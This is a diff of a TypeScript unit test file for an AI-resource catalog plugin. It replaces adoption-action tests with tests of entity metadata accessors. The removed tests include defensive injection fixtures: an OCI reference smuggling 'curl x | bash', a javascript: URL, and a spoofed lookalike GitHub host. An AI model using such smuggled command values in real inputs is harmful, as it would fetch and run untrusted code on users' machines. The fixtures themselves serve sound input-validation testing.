@@ -20,33 +20,39 @@ import type { FilterDefinition } from '../blueprints/AiCatalogFilterBlueprint';
 import {
   applyEntityFilters,
   entityRefHref,
-  getAdoptionAction,
+  getAgentModel,
+  getDistinctSpecField,
+  getHandoffRefs,
+  getModelsAvailable,
+  getProvider,
+  getSpecRemotes,
+  getSpecField,
+  getStringArraySpecField,
 } from './entityHelpers';
 
-function entity(overrides: {
-  name?: string;
-  specType?: string;
-  annotations?: Record<string, string>;
-  location?: { type?: string; target?: string };
-  remotes?: Array<{ url?: string; type?: string }>;
-}): Entity {
-  return {
-    apiVersion: 'backstage.io/v1alpha1',
-    kind: 'AiResource',
-    metadata: {
-      name: overrides.name ?? 'test-entity',
-      namespace: 'default',
-      annotations: overrides.annotations,
-    },
-    spec: {
-      type: overrides.specType,
-      lifecycle: 'production',
-      owner: 'team-test',
-      location: overrides.location,
-      remotes: overrides.remotes,
-    },
-  } as Entity;
-}
+const skill: Entity = {
+  apiVersion: 'backstage.io/v1alpha1',
+  kind: 'AiResource',
+  metadata: {
+    name: 'code-review',
+    namespace: 'default',
+    description: 'Automated code review skill',
+    tags: ['security'],
+  },
+  spec: { type: 'skill', lifecycle: 'production', owner: 'team-ai' },
+};
+
+const agent: Entity = {
+  apiVersion: 'backstage.io/v1alpha1',
+  kind: 'AiResource',
+  metadata: {
+    name: 'dev-assistant',
+    namespace: 'default',
+    description: 'AI developer assistant',
+    tags: ['agent'],
+  },
+  spec: { type: 'agent', lifecycle: 'experimental', owner: 'team-ml' },
+};
 
 describe('entityRefHref', () => {
   it('builds a group catalog URL from a bare owner name', () => {
@@ -72,295 +78,125 @@ describe('entityRefHref', () => {
   });
 });
 
-describe('getAdoptionAction', () => {
-  it('returns npx copy command for skill entities', () => {
-    const action = getAdoptionAction(
-      entity({ name: 'my-skill', specType: 'skill' }),
-    );
-    expect(action).toEqual({ type: 'copy', value: 'npx skills add my-skill' });
+describe('entity metadata accessors', () => {
+  it('reads the provider facet from the source annotation', () => {
+    const entity: Entity = {
+      ...skill,
+      metadata: {
+        ...skill.metadata,
+        annotations: { 'rhdh.io/ai-asset-source': 'ogx' },
+      },
+    };
+
+    expect(getProvider(entity)).toBe('ogx');
   });
 
-  it('returns podman pull command for the first oci:// remote', () => {
-    const action = getAdoptionAction(
-      entity({
-        specType: 'ai-tool',
-        remotes: [
-          { url: 'https://not-oci.example.com', type: 'other' },
-          { url: 'oci://registry.example.com/models/foo:latest', type: 'oci' },
-        ],
-      }),
-    );
-    expect(action).toEqual({
-      type: 'copy',
-      value: 'podman pull oci://registry.example.com/models/foo:latest',
-    });
+  it('reads the typed agent model', () => {
+    const entity: Entity = {
+      ...agent,
+      spec: {
+        ...agent.spec,
+        model: 'typed-model',
+      },
+    };
+
+    expect(getAgentModel(entity)).toBe('typed-model');
+    expect(getAgentModel({ ...entity, spec: agent.spec })).toBeUndefined();
   });
 
-  it('falls through to git-sourced action when the ai-asset-source annotation is oci but no oci:// remote exists (finding #1 regression)', () => {
-    const action = getAdoptionAction(
-      entity({
-        specType: 'ai-tool',
-        annotations: { 'rhdh.io/ai-asset-source': 'oci' },
-        location: {
-          type: 'git',
-          target: 'https://github.com/example/some-model',
+  it('ignores non-string spec values', () => {
+    expect(
+      getSpecField(
+        {
+          ...skill,
+          spec: { type: 'skill', enabled: true, count: 2 },
+        },
+        'enabled',
+      ),
+    ).toBeUndefined();
+    expect(getSpecField({ ...skill, spec: undefined }, 'type')).toBeUndefined();
+  });
+
+  it('returns spec text only when it differs from the description', () => {
+    expect(
+      getDistinctSpecField(
+        { ...skill, spec: { ...skill.spec, instructions: 'Use the skill.' } },
+        'instructions',
+      ),
+    ).toBe('Use the skill.');
+    expect(
+      getDistinctSpecField(
+        {
+          ...skill,
+          spec: { ...skill.spec, instructions: skill.metadata.description },
+        },
+        'instructions',
+      ),
+    ).toBeUndefined();
+  });
+
+  it('returns unique string model names from the model list', () => {
+    expect(
+      getModelsAvailable({
+        ...skill,
+        spec: {
+          type: 'ai-model-server',
+          models: { available: ['model-a', 42, 'model-a', null, 'model-b'] },
         },
       }),
-    );
-    expect(action?.type).toBe('link');
-    expect(action?.value).toBe(
-      'https://api.github.com/repos/example/some-model/zipball',
-    );
+    ).toEqual(['model-a', 'model-b']);
   });
 
-  it('falls through to MCP-remote action when the ai-asset-source annotation is oci but no oci:// remote exists', () => {
-    const action = getAdoptionAction(
-      entity({
-        specType: 'mcp-server',
-        annotations: { 'rhdh.io/ai-asset-source': 'oci' },
-        remotes: [
-          { url: 'https://mcp.example.com/server', type: 'streamable-http' },
-        ],
-      }),
-    );
-    expect(action).toEqual({
-      type: 'copy',
-      value: 'https://mcp.example.com/server',
-    });
-  });
-
-  it('resolves a branch-agnostic GitHub zipball URL for github.com targets', () => {
-    const action = getAdoptionAction(
-      entity({
-        specType: 'rule',
-        location: {
-          type: 'git',
-          target: 'https://github.com/example/some-rule',
+  it('returns unique non-empty handoff references', () => {
+    expect(
+      getHandoffRefs({
+        ...agent,
+        spec: {
+          ...agent.spec,
+          handoffs: [
+            'airesource:default/legal',
+            ' ',
+            'airesource:default/legal',
+            42,
+            ' airesource:default/support ',
+          ],
         },
       }),
-    );
-    expect(action).toEqual({
-      type: 'link',
-      value: 'https://api.github.com/repos/example/some-rule/zipball',
-    });
+    ).toEqual(['airesource:default/legal', 'airesource:default/support']);
   });
 
-  it('resolves a best-effort main-branch archive URL for gitlab.com targets', () => {
-    const action = getAdoptionAction(
-      entity({
-        specType: 'rule',
-        location: {
-          type: 'git',
-          target: 'https://gitlab.com/example/some-rule',
-        },
-      }),
-    );
-    expect(action).toEqual({
-      type: 'link',
-      value:
-        'https://gitlab.com/example/some-rule/-/archive/main/some-rule-main.zip',
-    });
-  });
-
-  it('does not treat a spoofed lookalike host as a git host (finding #3 regression)', () => {
-    const action = getAdoptionAction(
-      entity({
-        specType: 'rule',
-        location: {
-          type: 'git',
-          target: 'https://evil.github.com.attacker.com/example/some-rule',
-        },
-      }),
-    );
-    expect(action).toBeUndefined();
-  });
-
-  it('does not treat a malformed URL as a git host', () => {
-    const action = getAdoptionAction(
-      entity({
-        specType: 'rule',
-        location: { type: 'git', target: 'not-a-valid-url' },
-      }),
-    );
-    expect(action).toBeUndefined();
-  });
-
-  it('selects the remote explicitly typed streamable-http over an earlier non-matching remote (finding #6 regression)', () => {
-    const action = getAdoptionAction(
-      entity({
-        specType: 'mcp-server',
-        remotes: [
-          { url: 'https://docs.example.com/mcp-server', type: 'docs' },
-          { url: 'https://mcp.example.com/server', type: 'streamable-http' },
-        ],
-      }),
-    );
-    expect(action).toEqual({
-      type: 'copy',
-      value: 'https://mcp.example.com/server',
-    });
-  });
-
-  it('falls back to the first remote with a url when no remote is typed streamable-http', () => {
-    const action = getAdoptionAction(
-      entity({
-        specType: 'mcp-server',
-        remotes: [{ url: 'https://mcp.example.com/server', type: 'other' }],
-      }),
-    );
-    expect(action).toEqual({
-      type: 'copy',
-      value: 'https://mcp.example.com/server',
-    });
-  });
-
-  it('matches specType case-insensitively (e.g. Skill)', () => {
-    const action = getAdoptionAction(
-      entity({ name: 'my-skill', specType: 'Skill' }),
-    );
-    expect(action).toEqual({ type: 'copy', value: 'npx skills add my-skill' });
-  });
-
-  it('matches mcp-server specType case-insensitively', () => {
-    const action = getAdoptionAction(
-      entity({
-        specType: 'MCP-Server',
-        remotes: [
-          { url: 'https://mcp.example.com/server', type: 'streamable-http' },
-        ],
-      }),
-    );
-    expect(action).toEqual({
-      type: 'copy',
-      value: 'https://mcp.example.com/server',
-    });
-  });
-
-  it('does not resolve git-sourced action when location.type is not git', () => {
-    const action = getAdoptionAction(
-      entity({
-        specType: 'rule',
-        location: {
-          type: 'url',
-          target: 'https://github.com/example/some-rule',
-        },
-      }),
-    );
-    expect(action).toBeUndefined();
-  });
-
-  it('returns undefined when no actionable metadata is present', () => {
-    const action = getAdoptionAction(entity({ specType: 'ai-tool' }));
-    expect(action).toBeUndefined();
-  });
-
-  it('rejects an oci:// remote containing shell metacharacters (clipboard injection regression)', () => {
-    const action = getAdoptionAction(
-      entity({
-        specType: 'ai-tool',
-        remotes: [{ url: 'oci://evil; curl x | bash', type: 'oci' }],
-      }),
-    );
-    expect(action).toBeUndefined();
-  });
-
-  it('skips an unsafe oci:// remote and resolves the next valid one', () => {
-    const action = getAdoptionAction(
-      entity({
-        specType: 'ai-tool',
-        remotes: [
-          { url: 'oci://evil; curl x | bash', type: 'oci' },
-          { url: 'oci://registry.example.com/models/foo:latest', type: 'oci' },
-        ],
-      }),
-    );
-    expect(action).toEqual({
-      type: 'copy',
-      value: 'podman pull oci://registry.example.com/models/foo:latest',
-    });
-  });
-
-  it('accepts an oci:// reference with a registry port and tag', () => {
-    const action = getAdoptionAction(
-      entity({
-        specType: 'ai-tool',
-        remotes: [
-          {
-            url: 'oci://registry.example.com:5000/models/foo:latest',
-            type: 'oci',
+  it('returns unique string values from list-valued spec fields', () => {
+    expect(
+      getStringArraySpecField(
+        {
+          ...skill,
+          spec: {
+            ...skill.spec,
+            categories: ['security', 'security', '', 42, ' quality '],
           },
-        ],
-      }),
-    );
-    expect(action).toEqual({
-      type: 'copy',
-      value: 'podman pull oci://registry.example.com:5000/models/foo:latest',
-    });
+        },
+        'categories',
+      ),
+    ).toEqual(['security', 'quality']);
   });
 
-  it('does not guess a wrong owner/repo for a GitHub subpage URL (archive URL parsing regression)', () => {
-    const target = 'https://github.com/example/repo/tree/main';
-    const action = getAdoptionAction(
-      entity({
-        specType: 'rule',
-        location: { type: 'git', target },
+  it('returns valid remote entries and ignores malformed values', () => {
+    expect(
+      getSpecRemotes({
+        ...skill,
+        spec: {
+          ...skill.spec,
+          remotes: [
+            { url: 'https://mcp.example.com', type: 'streamable-http' },
+            { url: '  ' },
+            { type: 'missing-url' },
+            'invalid',
+          ],
+        },
       }),
-    );
-    expect(action).toEqual({ type: 'link', value: target });
-  });
-
-  it('rejects an MCP remote URL with a non-http(s) scheme', () => {
-    const scriptUrl = ['java', 'script:alert(1)'].join('');
-    const action = getAdoptionAction(
-      entity({
-        specType: 'mcp-server',
-        remotes: [{ url: scriptUrl, type: 'streamable-http' }],
-      }),
-    );
-    expect(action).toBeUndefined();
-  });
-
-  it('skips a non-http(s) MCP remote and resolves the next valid streamable-http one', () => {
-    const scriptUrl = ['java', 'script:alert(1)'].join('');
-    const action = getAdoptionAction(
-      entity({
-        specType: 'mcp-server',
-        remotes: [
-          { url: scriptUrl, type: 'other' },
-          { url: 'https://mcp.example.com/server', type: 'streamable-http' },
-        ],
-      }),
-    );
-    expect(action).toEqual({
-      type: 'copy',
-      value: 'https://mcp.example.com/server',
-    });
+    ).toEqual([{ url: 'https://mcp.example.com', type: 'streamable-http' }]);
   });
 });
-
-const skill: Entity = {
-  apiVersion: 'backstage.io/v1alpha1',
-  kind: 'AiResource',
-  metadata: {
-    name: 'code-review',
-    namespace: 'default',
-    description: 'Automated code review skill',
-    tags: ['security'],
-  },
-  spec: { type: 'skill', lifecycle: 'production', owner: 'team-ai' },
-};
-
-const agent: Entity = {
-  apiVersion: 'backstage.io/v1alpha1',
-  kind: 'AiResource',
-  metadata: {
-    name: 'dev-assistant',
-    namespace: 'default',
-    description: 'AI developer assistant',
-    tags: ['agent'],
-  },
-  spec: { type: 'agent', lifecycle: 'experimental', owner: 'team-ml' },
-};
 
 const entities = [skill, agent];
 
